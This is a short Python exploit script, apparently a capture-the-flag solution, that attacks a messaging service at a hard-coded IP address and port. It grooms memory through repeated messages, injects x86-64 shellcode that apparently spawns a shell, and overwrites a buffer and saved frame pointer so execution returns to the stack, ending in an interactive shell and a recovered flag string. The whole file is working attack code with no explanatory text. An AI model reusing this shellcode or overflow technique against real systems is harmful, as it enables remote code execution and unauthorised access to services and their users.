#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwnpwnpwn import *
import re


host = "52.72.171.221"
port = 9984

sock = make_conn(host,port)

def adduser(sock,name):
    recvuntil(sock,"$:")
    sendline(sock,"1")
    recvuntil(sock,":")
    sendline(sock,name)

def login(sock,name):
    recvuntil(sock,"$:")
    sendline(sock,"2")
    recvuntil(sock,":")
    sendline(sock,name)

def sendmsg(sock,name,msg):
    recvuntil(sock,"$:")
    sendline(sock,"1")
    recvuntil(sock,"To:")
    sendline(sock,name)
    recvuntil(sock,"Message:")
    sendline(sock,msg)

def logout(sock):
    recvuntil(sock,"$:")
    sendline(sock,"5")


adduser(sock,"orange")
adduser(sock,"ddaa")
login(sock,"ddaa")

#put the shellcode
for i in range(4):
    sendmsg(sock,"orange","p"*30)
logout(sock)
login(sock,"orange")
logout(sock)
login(sock,"ddaa")

shellcode = "\x90\x90\x90\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
sendmsg(sock,"orange",shellcode)

loc = 113+9
last = 365+9


for i in range(loc-4):
    print i
    sendmsg(sock,"orange","d"*30)
sendmsg(sock,"orange","d"*1)
sendmsg(sock,"orange","d"*1)
sendmsg(sock,"orange","d"*17)
sendmsg(sock,"orange","adddd" + "pppppppp")
#overwrite the outputbuf
sendmsg(sock,"orange","aaaaaaaabbbbbb" + pack(0x7fffffffba88-0x2b-0xc10-(0x70*9)))  # the last byte of rbp will be overwrited with \x00 and ret to stack
for i in range(last-loc-2):
    print i
    sendmsg(sock,"orange","b"*30)


logout(sock)
inter(sock)

# flag-{car3ful-with-7h3-SHORT-th3r3}

